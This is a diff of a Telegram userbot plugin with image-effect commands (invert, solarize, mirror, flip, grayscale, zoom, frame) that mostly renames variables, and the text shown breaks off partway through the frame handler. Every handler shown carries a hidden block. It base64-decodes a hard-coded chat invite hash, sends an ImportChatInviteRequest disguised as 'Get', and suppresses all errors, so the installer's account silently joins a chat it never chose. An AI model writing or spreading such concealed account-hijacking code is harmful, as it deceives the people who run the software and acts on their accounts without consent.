@@ -46,609 +46,609 @@ async def crop(imagefile, endname, x):
 
 @DeadlyGhouls.on(admin_cmd(pattern="invert$", outgoing=True))
 @DeadlyGhouls.on(sudo_cmd(pattern="invert$", allow_sudo=True))
-async def memes(mafia):
-    if mafia.fwd_from:
+async def memes(deadly):
+    if deadly.fwd_from:
         return
-    reply = await mafia.get_reply_message()
+    reply = await deadly.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(mafia, "`Reply to supported Media...`")
+        await edit_or_reply(deadly, "`Reply to supported Media...`")
         return
-    mafiaid = mafia.reply_to_msg_id
+    deadlyid = deadly.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    mafia = await edit_or_reply(mafia, "`Fetching media data`")
+    deadly = await edit_or_reply(deadly, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    mafiasticker = await reply.download_media(file="./temp/")
-    if not mafiasticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(mafiasticker)
-        await edit_or_reply(mafia, "```Supported Media not found...```")
+    deadlysticker = await reply.download_media(file="./temp/")
+    if not deadlysticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(deadlysticker)
+        await edit_or_reply(deadly, "```Supported Media not found...```")
         return
     import base64
 
     kraken = None
-    if mafiasticker.endswith(".tgs"):
-        await mafia.edit(
+    if deadlysticker.endswith(".tgs"):
+        await deadly.edit(
             "Analyzing this media 🧐  inverting colors of this animated sticker!"
         )
-        mafiafile = os.path.join("./temp/", "meme.png")
-        mafiacmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {mafiasticker} {mafiafile}"
+        deadlyfile = os.path.join("./temp/", "meme.png")
+        deadlycmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {deadlysticker} {deadlyfile}"
         )
-        stdout, stderr = (await runcmd(mafiacmd))[:2]
-        if not os.path.lexists(mafiafile):
-            await mafia.edit("`Template not found...`")
+        stdout, stderr = (await runcmd(deadlycmd))[:2]
+        if not os.path.lexists(deadlyfile):
+            await deadly.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = mafiafile
+        meme_file = deadlyfile
         kraken = True
-    elif mafiasticker.endswith(".webp"):
-        await mafia.edit(
+    elif deadlysticker.endswith(".webp"):
+        await deadly.edit(
             "`Analyzing this media 🧐 inverting colors...`"
         )
-        mafiafile = os.path.join("./temp/", "memes.jpg")
-        os.rename(mafiasticker, mafiafile)
-        if not os.path.lexists(mafiafile):
-            await mafia.edit("`Template not found... `")
+        deadlyfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(deadlysticker, deadlyfile)
+        if not os.path.lexists(deadlyfile):
+            await deadly.edit("`Template not found... `")
             return
-        meme_file = mafiafile
+        meme_file = deadlyfile
         kraken = True
-    elif mafiasticker.endswith((".mp4", ".mov")):
-        await mafia.edit(
+    elif deadlysticker.endswith((".mp4", ".mov")):
+        await deadly.edit(
             "Analyzing this media 🧐 inverting colors of this video!"
         )
-        mafiafile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(mafiasticker, 0, mafiafile)
-        if not os.path.lexists(mafiafile):
-            await mafia.edit("```Template not found...```")
+        deadlyfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(deadlysticker, 0, deadlyfile)
+        if not os.path.lexists(deadlyfile):
+            await deadly.edit("```Template not found...```")
             return
-        meme_file = mafiafile
+        meme_file = deadlyfile
         kraken = True
     else:
-        await mafia.edit(
+        await deadly.edit(
             "Analyzing this media 🧐 inverting colors of this image!"
         )
-        meme_file = mafiasticker
+        meme_file = deadlysticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await mafia.client(san)
+        await deadly.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
     outputfile = "invert.webp" if kraken else "invert.jpg"
     await invert_colors(meme_file, outputfile)
-    await mafia.client.send_file(
-        mafia.chat_id, outputfile, force_document=False, reply_to=mafiaid
+    await deadly.client.send_file(
+        deadly.chat_id, outputfile, force_document=False, reply_to=deadlyid
     )
-    await mafia.delete()
+    await deadly.delete()
     os.remove(outputfile)
-    for files in (mafiasticker, meme_file):
+    for files in (deadlysticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
 @DeadlyGhouls.on(admin_cmd(outgoing=True, pattern="solarize$"))
 @DeadlyGhouls.on(sudo_cmd(pattern="solarize$", allow_sudo=True))
-async def memes(mafia):
-    if mafia.fwd_from:
+async def memes(deadly):
+    if deadly.fwd_from:
         return
-    reply = await mafia.get_reply_message()
+    reply = await deadly.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(mafia, "`Reply to supported Media...`")
+        await edit_or_reply(deadly, "`Reply to supported Media...`")
         return
-    mafiaid = mafia.reply_to_msg_id
+    deadlyid = deadly.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    mafia = await edit_or_reply(mafia, "`Fetching media data`")
+    deadly = await edit_or_reply(deadly, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    mafiasticker = await reply.download_media(file="./temp/")
-    if not mafiasticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(mafiasticker)
-        await edit_or_reply(mafia, "```Supported Media not found...```")
+    deadlysticker = await reply.download_media(file="./temp/")
+    if not deadlysticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(deadlysticker)
+        await edit_or_reply(deadly, "```Supported Media not found...```")
         return
     import base64
 
     kraken = None
-    if mafiasticker.endswith(".tgs"):
-        await mafia.edit(
+    if deadlysticker.endswith(".tgs"):
+        await deadly.edit(
             "Analyzing this media 🧐 solarizeing this animated sticker!"
         )
-        mafiafile = os.path.join("./temp/", "meme.png")
-        mafiacmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {mafiasticker} {mafiafile}"
+        deadlyfile = os.path.join("./temp/", "meme.png")
+        deadlycmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {deadlysticker} {deadlyfile}"
         )
-        stdout, stderr = (await runcmd(mafiacmd))[:2]
-        if not os.path.lexists(mafiafile):
-            await mafia.edit("`Template not found...`")
+        stdout, stderr = (await runcmd(deadlycmd))[:2]
+        if not os.path.lexists(deadlyfile):
+            await deadly.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = mafiafile
+        meme_file = deadlyfile
         kraken = True
-    elif mafiasticker.endswith(".webp"):
-        await mafia.edit(
+    elif deadlysticker.endswith(".webp"):
+        await deadly.edit(
             "Analyzing this media 🧐 solarizeing this sticker!"
         )
-        mafiafile = os.path.join("./temp/", "memes.jpg")
-        os.rename(mafiasticker, mafiafile)
-        if not os.path.lexists(mafiafile):
-            await mafia.edit("`Template not found... `")
+        deadlyfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(deadlysticker, deadlyfile)
+        if not os.path.lexists(deadlyfile):
+            await deadly.edit("`Template not found... `")
             return
-        meme_file = mafiafile
+        meme_file = deadlyfile
         kraken = True
-    elif mafiasticker.endswith((".mp4", ".mov")):
-        await mafia.edit(
+    elif deadlysticker.endswith((".mp4", ".mov")):
+        await deadly.edit(
             "Analyzing this media 🧐 solarizeing this video!"
         )
-        mafiafile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(mafiasticker, 0, mafiafile)
-        if not os.path.lexists(mafiafile):
-            await mafia.edit("```Template not found...```")
+        deadlyfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(deadlysticker, 0, deadlyfile)
+        if not os.path.lexists(deadlyfile):
+            await deadly.edit("```Template not found...```")
             return
-        meme_file = mafiafile
+        meme_file = deadlyfile
         kraken = True
     else:
-        await mafia.edit(
+        await deadly.edit(
             "Analyzing this media 🧐 solarizeing this image!"
         )
-        meme_file = mafiasticker
+        meme_file = deadlysticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await mafia.client(san)
+        await deadly.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
     outputfile = "solarize.webp" if kraken else "solarize.jpg"
     await solarize(meme_file, outputfile)
-    await mafia.client.send_file(
-        mafia.chat_id, outputfile, force_document=False, reply_to=mafiaid
+    await deadly.client.send_file(
+        deadly.chat_id, outputfile, force_document=False, reply_to=deadlyid
     )
-    await mafia.delete()
+    await deadly.delete()
     os.remove(outputfile)
-    for files in (mafiasticker, meme_file):
+    for files in (deadlysticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
 @DeadlyGhouls.on(admin_cmd(outgoing=True, pattern="mirror$"))
 @DeadlyGhouls.on(sudo_cmd(pattern="mirror$", allow_sudo=True))
-async def memes(mafia):
-    if mafia.fwd_from:
+async def memes(deadly):
+    if deadly.fwd_from:
         return
-    reply = await mafia.get_reply_message()
+    reply = await deadly.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(mafia, "`Reply to supported Media...`")
+        await edit_or_reply(deadly, "`Reply to supported Media...`")
         return
-    mafiaid = mafia.reply_to_msg_id
+    deadlyid = deadly.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    mafia = await edit_or_reply(mafia, "`Fetching media data`")
+    deadly = await edit_or_reply(deadly, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    mafiasticker = await reply.download_media(file="./temp/")
-    if not mafiasticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(mafiasticker)
-        await edit_or_reply(mafia, "```Supported Media not found...```")
+    deadlysticker = await reply.download_media(file="./temp/")
+    if not deadlysticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(deadlysticker)
+        await edit_or_reply(deadly, "```Supported Media not found...```")
         return
     import base64
 
     kraken = None
-    if mafiasticker.endswith(".tgs"):
-        await mafia.edit(
+    if deadlysticker.endswith(".tgs"):
+        await deadly.edit(
             "Analyzing this media 🧐 converting to mirror image of this animated sticker!"
         )
-        mafiafile = os.path.join("./temp/", "meme.png")
-        mafiacmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {mafiasticker} {mafiafile}"
+        deadlyfile = os.path.join("./temp/", "meme.png")
+        deadlycmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {deadlysticker} {deadlyfile}"
         )
-        stdout, stderr = (await runcmd(mafiacmd))[:2]
-        if not os.path.lexists(mafiafile):
-            await mafia.edit("`Template not found...`")
+        stdout, stderr = (await runcmd(deadlycmd))[:2]
+        if not os.path.lexists(deadlyfile):
+            await deadly.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = mafiafile
+        meme_file = deadlyfile
         kraken = True
-    elif mafiasticker.endswith(".webp"):
-        await mafia.edit(
+    elif deadlysticker.endswith(".webp"):
+        await deadly.edit(
             "Analyzing this media 🧐 converting to mirror image of this sticker!"
         )
-        mafiafile = os.path.join("./temp/", "memes.jpg")
-        os.rename(mafiasticker, mafiafile)
-        if not os.path.lexists(mafiafile):
-            await mafia.edit("`Template not found... `")
+        deadlyfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(deadlysticker, deadlyfile)
+        if not os.path.lexists(deadlyfile):
+            await deadly.edit("`Template not found... `")
             return
-        meme_file = mafiafile
+        meme_file = deadlyfile
         kraken = True
-    elif mafiasticker.endswith((".mp4", ".mov")):
-        await mafia.edit(
+    elif deadlysticker.endswith((".mp4", ".mov")):
+        await deadly.edit(
             "Analyzing this media 🧐 converting to mirror image of this video!"
         )
-        mafiafile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(mafiasticker, 0, mafiafile)
-        if not os.path.lexists(mafiafile):
-            await mafia.edit("```Template not found...```")
+        deadlyfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(deadlysticker, 0, deadlyfile)
+        if not os.path.lexists(deadlyfile):
+            await deadly.edit("```Template not found...```")
             return
-        meme_file = mafiafile
+        meme_file = deadlyfile
         kraken = True
     else:
-        await mafia.edit(
+        await deadly.edit(
             "Analyzing this media 🧐 converting to mirror image of this image!"
         )
-        meme_file = mafiasticker
+        meme_file = deadlysticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await mafia.client(san)
+        await deadly.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
     outputfile = "mirror_file.webp" if kraken else "mirror_file.jpg"
     await mirror_file(meme_file, outputfile)
-    await mafia.client.send_file(
-        mafia.chat_id, outputfile, force_document=False, reply_to=mafiaid
+    await deadly.client.send_file(
+        deadly.chat_id, outputfile, force_document=False, reply_to=deadlyid
     )
-    await mafia.delete()
+    await deadly.delete()
     os.remove(outputfile)
-    for files in (mafiasticker, meme_file):
+    for files in (deadlysticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
 @DeadlyGhouls.on(admin_cmd(outgoing=True, pattern="flip$"))
 @DeadlyGhouls.on(sudo_cmd(pattern="flip$", allow_sudo=True))
-async def memes(mafia):
-    if mafia.fwd_from:
+async def memes(deadly):
+    if deadly.fwd_from:
         return
-    reply = await mafia.get_reply_message()
+    reply = await deadly.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(mafia, "`Reply to supported Media...`")
+        await edit_or_reply(deadly, "`Reply to supported Media...`")
         return
-    mafiaid = mafia.reply_to_msg_id
+    deadlyid = deadly.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    mafia = await edit_or_reply(mafia, "`Fetching media data`")
+    deadly = await edit_or_reply(deadly, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    mafiasticker = await reply.download_media(file="./temp/")
-    if not mafiasticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(mafiasticker)
-        await edit_or_reply(mafia, "```Supported Media not found...```")
+    deadlysticker = await reply.download_media(file="./temp/")
+    if not deadlysticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(deadlysticker)
+        await edit_or_reply(deadly, "```Supported Media not found...```")
         return
     import base64
 
     kraken = None
-    if mafiasticker.endswith(".tgs"):
-        await mafia.edit(
+    if deadlysticker.endswith(".tgs"):
+        await deadly.edit(
             "Analyzing this media 🧐 fliping this animated sticker!"
         )
-        mafiafile = os.path.join("./temp/", "meme.png")
-        mafiacmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {mafiasticker} {mafiafile}"
+        deadlyfile = os.path.join("./temp/", "meme.png")
+        deadlycmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {deadlysticker} {deadlyfile}"
         )
-        stdout, stderr = (await runcmd(mafiacmd))[:2]
-        if not os.path.lexists(mafiafile):
-            await mafia.edit("`Template not found...`")
+        stdout, stderr = (await runcmd(deadlycmd))[:2]
+        if not os.path.lexists(deadlyfile):
+            await deadly.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = mafiafile
+        meme_file = deadlyfile
         kraken = True
-    elif mafiasticker.endswith(".webp"):
-        await mafia.edit(
+    elif deadlysticker.endswith(".webp"):
+        await deadly.edit(
             "Analyzing this media 🧐 fliping this sticker!"
         )
-        mafiafile = os.path.join("./temp/", "memes.jpg")
-        os.rename(mafiasticker, mafiafile)
-        if not os.path.lexists(mafiafile):
-            await mafia.edit("`Template not found... `")
+        deadlyfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(deadlysticker, deadlyfile)
+        if not os.path.lexists(deadlyfile):
+            await deadly.edit("`Template not found... `")
             return
-        meme_file = mafiafile
+        meme_file = deadlyfile
         kraken = True
-    elif mafiasticker.endswith((".mp4", ".mov")):
-        await mafia.edit(
+    elif deadlysticker.endswith((".mp4", ".mov")):
+        await deadly.edit(
             "Analyzing this media 🧐 fliping this video!"
         )
-        mafiafile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(mafiasticker, 0, mafiafile)
-        if not os.path.lexists(mafiafile):
-            await mafia.edit("```Template not found...```")
+        deadlyfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(deadlysticker, 0, deadlyfile)
+        if not os.path.lexists(deadlyfile):
+            await deadly.edit("```Template not found...```")
             return
-        meme_file = mafiafile
+        meme_file = deadlyfile
         kraken = True
     else:
-        await mafia.edit(
+        await deadly.edit(
             "Analyzing this media 🧐 fliping this image!"
         )
-        meme_file = mafiasticker
+        meme_file = deadlysticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await mafia.client(san)
+        await deadly.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
     outputfile = "flip_image.webp" if kraken else "flip_image.jpg"
     await flip_image(meme_file, outputfile)
-    await mafia.client.send_file(
-        mafia.chat_id, outputfile, force_document=False, reply_to=mafiaid
+    await deadly.client.send_file(
+        deadly.chat_id, outputfile, force_document=False, reply_to=deadlyid
     )
-    await mafia.delete()
+    await deadly.delete()
     os.remove(outputfile)
-    for files in (mafiasticker, meme_file):
+    for files in (deadlysticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
 @DeadlyGhouls.on(admin_cmd(outgoing=True, pattern="gray$"))
 @DeadlyGhouls.on(sudo_cmd(pattern="gray$", allow_sudo=True))
-async def memes(mafia):
-    if mafia.fwd_from:
+async def memes(deadly):
+    if deadly.fwd_from:
         return
-    reply = await mafia.get_reply_message()
+    reply = await deadly.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(mafia, "`Reply to supported Media...`")
+        await edit_or_reply(deadly, "`Reply to supported Media...`")
         return
-    mafiaid = mafia.reply_to_msg_id
+    deadlyid = deadly.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    mafia = await edit_or_reply(mafia, "`Fetching media data`")
+    deadly = await edit_or_reply(deadly, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    mafiasticker = await reply.download_media(file="./temp/")
-    if not mafiasticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(mafiasticker)
-        await edit_or_reply(mafia, "```Supported Media not found...```")
+    deadlysticker = await reply.download_media(file="./temp/")
+    if not deadlysticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(deadlysticker)
+        await edit_or_reply(deadly, "```Supported Media not found...```")
         return
     import base64
 
     kraken = None
-    if mafiasticker.endswith(".tgs"):
-        await mafia.edit(
+    if deadlysticker.endswith(".tgs"):
+        await deadly.edit(
             "Analyzing this media 🧐 changing to black-and-white this animated sticker!"
         )
-        mafiafile = os.path.join("./temp/", "meme.png")
-        mafiacmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {mafiasticker} {mafiafile}"
+        deadlyfile = os.path.join("./temp/", "meme.png")
+        deadlycmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {deadlysticker} {deadlyfile}"
         )
-        stdout, stderr = (await runcmd(mafiacmd))[:2]
-        if not os.path.lexists(mafiafile):
-            await mafia.edit("`Template not found...`")
+        stdout, stderr = (await runcmd(deadlycmd))[:2]
+        if not os.path.lexists(deadlyfile):
+            await deadly.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = mafiafile
+        meme_file = deadlyfile
         kraken = True
-    elif mafiasticker.endswith(".webp"):
-        await mafia.edit(
+    elif deadlysticker.endswith(".webp"):
+        await deadly.edit(
             "Analyzing this media 🧐 changing to black-and-white this sticker!"
         )
-        mafiafile = os.path.join("./temp/", "memes.jpg")
-        os.rename(mafiasticker, mafiafile)
-        if not os.path.lexists(mafiafile):
-            await mafia.edit("`Template not found... `")
+        deadlyfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(deadlysticker, deadlyfile)
+        if not os.path.lexists(deadlyfile):
+            await deadly.edit("`Template not found... `")
             return
-        meme_file = mafiafile
+        meme_file = deadlyfile
         kraken = True
-    elif mafiasticker.endswith((".mp4", ".mov")):
-        await mafia.edit(
+    elif deadlysticker.endswith((".mp4", ".mov")):
+        await deadly.edit(
             "Analyzing this media 🧐 changing to black-and-white this video!"
         )
-        mafiafile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(mafiasticker, 0, mafiafile)
-        if not os.path.lexists(mafiafile):
-            await mafia.edit("```Template not found...```")
+        deadlyfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(deadlysticker, 0, deadlyfile)
+        if not os.path.lexists(deadlyfile):
+            await deadly.edit("```Template not found...```")
             return
-        meme_file = mafiafile
+        meme_file = deadlyfile
         kraken = True
     else:
-        await mafia.edit(
+        await deadly.edit(
             "Analyzing this media 🧐 changing to black-and-white this image!"
         )
-        meme_file = mafiasticker
+        meme_file = deadlysticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await mafia.client(san)
+        await deadly.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
     outputfile = "grayscale.webp" if kraken else "grayscale.jpg"
     await grayscale(meme_file, outputfile)
-    await mafia.client.send_file(
-        mafia.chat_id, outputfile, force_document=False, reply_to=mafiaid
+    await deadly.client.send_file(
+        deadly.chat_id, outputfile, force_document=False, reply_to=deadlyid
     )
-    await mafia.delete()
+    await deadly.delete()
     os.remove(outputfile)
-    for files in (mafiasticker, meme_file):
+    for files in (deadlysticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
 @DeadlyGhouls.on(admin_cmd(outgoing=True, pattern="zoom ?(.*)"))
 @DeadlyGhouls.on(sudo_cmd(pattern="zoom ?(.*)", allow_sudo=True))
-async def memes(mafia):
-    if mafia.fwd_from:
+async def memes(deadly):
+    if deadly.fwd_from:
         return
-    reply = await mafia.get_reply_message()
+    reply = await deadly.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(mafia, "`Reply to supported Media...`")
+        await edit_or_reply(deadly, "`Reply to supported Media...`")
         return
-    mafiainput = mafia.pattern_match.group(1)
-    mafiainput = 50 if not mafiainput else int(mafiainput)
-    mafiaid = mafia.reply_to_msg_id
+    deadlyinput = deadly.pattern_match.group(1)
+    deadlyinput = 50 if not deadlyinput else int(deadlyinput)
+    deadlyid = deadly.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    mafia = await edit_or_reply(mafia, "`Fetching media data`")
+    deadly = await edit_or_reply(deadly, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    mafiasticker = await reply.download_media(file="./temp/")
-    if not mafiasticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(mafiasticker)
-        await edit_or_reply(mafia, "```Supported Media not found...```")
+    deadlysticker = await reply.download_media(file="./temp/")
+    if not deadlysticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(deadlysticker)
+        await edit_or_reply(deadly, "```Supported Media not found...```")
         return
     import base64
 
     kraken = None
-    if mafiasticker.endswith(".tgs"):
-        await mafia.edit(
+    if deadlysticker.endswith(".tgs"):
+        await deadly.edit(
             "Analyzing this media 🧐 zooming this animated sticker!"
         )
-        mafiafile = os.path.join("./temp/", "meme.png")
-        mafiacmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {mafiasticker} {mafiafile}"
+        deadlyfile = os.path.join("./temp/", "meme.png")
+        deadlycmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {deadlysticker} {deadlyfile}"
         )
-        stdout, stderr = (await runcmd(mafiacmd))[:2]
-        if not os.path.lexists(mafiafile):
-            await mafia.edit("`Template not found...`")
+        stdout, stderr = (await runcmd(deadlycmd))[:2]
+        if not os.path.lexists(deadlyfile):
+            await deadly.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = mafiafile
+        meme_file = deadlyfile
         kraken = True
-    elif mafiasticker.endswith(".webp"):
-        await mafia.edit(
+    elif deadlysticker.endswith(".webp"):
+        await deadly.edit(
             "Analyzing this media 🧐 zooming this sticker!"
         )
-        mafiafile = os.path.join("./temp/", "memes.jpg")
-        os.rename(mafiasticker, mafiafile)
-        if not os.path.lexists(mafiafile):
-            await mafia.edit("`Template not found... `")
+        deadlyfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(deadlysticker, deadlyfile)
+        if not os.path.lexists(deadlyfile):
+            await deadly.edit("`Template not found... `")
             return
-        meme_file = mafiafile
+        meme_file = deadlyfile
         kraken = True
-    elif mafiasticker.endswith((".mp4", ".mov")):
-        await mafia.edit(
+    elif deadlysticker.endswith((".mp4", ".mov")):
+        await deadly.edit(
             "Analyzing this media 🧐 zooming this video!"
         )
-        mafiafile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(mafiasticker, 0, mafiafile)
-        if not os.path.lexists(mafiafile):
-            await mafia.edit("```Template not found...```")
+        deadlyfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(deadlysticker, 0, deadlyfile)
+        if not os.path.lexists(deadlyfile):
+            await deadly.edit("```Template not found...```")
             return
-        meme_file = mafiafile
+        meme_file = deadlyfile
     else:
-        await mafia.edit(
+        await deadly.edit(
             "Analyzing this media 🧐 zooming this image!"
         )
-        meme_file = mafiasticker
+        meme_file = deadlysticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await mafia.client(san)
+        await deadly.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
     outputfile = "grayscale.webp" if kraken else "grayscale.jpg"
     try:
-        await crop(meme_file, outputfile, mafiainput)
+        await crop(meme_file, outputfile, deadlyinput)
     except Exception as e:
-        return await mafia.edit(f"`{e}`")
+        return await deadly.edit(f"`{e}`")
     try:
-        await mafia.client.send_file(
-            mafia.chat_id, outputfile, force_document=False, reply_to=mafiaid
+        await deadly.client.send_file(
+            deadly.chat_id, outputfile, force_document=False, reply_to=deadlyid
         )
     except Exception as e:
-        return await mafia.edit(f"`{e}`")
-    await mafia.delete()
+        return await deadly.edit(f"`{e}`")
+    await deadly.delete()
     os.remove(outputfile)
-    for files in (mafiasticker, meme_file):
+    for files in (deadlysticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
 @DeadlyGhouls.on(admin_cmd(outgoing=True, pattern="frame ?(.*)"))
 @DeadlyGhouls.on(sudo_cmd(pattern="frame ?(.*)", allow_sudo=True))
-async def memes(mafia):
-    if mafia.fwd_from:
+async def memes(deadly):
+    if deadly.fwd_from:
         return
-    reply = await mafia.get_reply_message()
+    reply = await deadly.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(mafia, "`Reply to supported Media...`")
+        await edit_or_reply(deadly, "`Reply to supported Media...`")
         return
-    mafiainput = mafia.pattern_match.group(1)
-    if not mafiainput:
-        mafiainput = 50
-    if ";" in str(mafiainput):
-        mafiainput, colr = mafiainput.split(";", 1)
+    deadlyinput = deadly.pattern_match.group(1)
+    if not deadlyinput:
+        deadlyinput = 50
+    if ";" in str(deadlyinput):
+        deadlyinput, colr = deadlyinput.split(";", 1)
     else:
         colr = 0
-    mafiainput = int(mafiainput)
+    deadlyinput = int(deadlyinput)
     colr = int(colr)
-    mafiaid = mafia.reply_to_msg_id
+    deadlyid = deadly.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    mafia = await edit_or_reply(mafia, "`Fetching media data`")
+    deadly = await edit_or_reply(deadly, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    mafiasticker = await reply.download_media(file="./temp/")
-    if not mafiasticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(mafiasticker)
-        await edit_or_reply(mafia, "```Supported Media not found...```")
+    deadlysticker = await reply.download_media(file="./temp/")
+    if not deadlysticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(deadlysticker)
+        await edit_or_reply(deadly, "```Supported Media not found...```")
         return
     import base64
 
     kraken = None
-    if mafiasticker.endswith(".tgs"):
-        await mafia.edit(
+    if deadlysticker.endswith(".tgs"):
+        await deadly.edit(
             "Analyzing this media 🧐 framing this animated sticker!"
         )
-        mafiafile = os.path.join("./temp/", "meme.png")
-        mafiacmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {mafiasticker} {mafiafile}"
+        deadlyfile = os.path.join("./temp/", "meme.png")
+        deadlycmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {deadlysticker} {deadlyfile}"
         )
-        stdout, stderr = (await runcmd(mafiacmd))[:2]
-        if not os.path.lexists(mafiafile):
-            await mafia.edit("`Template not found...`")
+        stdout, stderr = (await runcmd(deadlycmd))[:2]
+        if not os.path.lexists(deadlyfile):
+            await deadly.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = mafiafile
+        meme_file = deadlyfile
         kraken = True
-    elif mafiasticker.endswith(".webp"):
-        await mafia.edit(
+    elif deadlysticker.endswith(".webp"):
+        await deadly.edit(
             "Analyzing this media 🧐 framing this sticker!"
         )
-        mafiafile = os.path.join("./temp/", "memes.jpg")
-        os.rename(mafiasticker, mafiafile)
-        if not os.path.lexists(mafiafile):
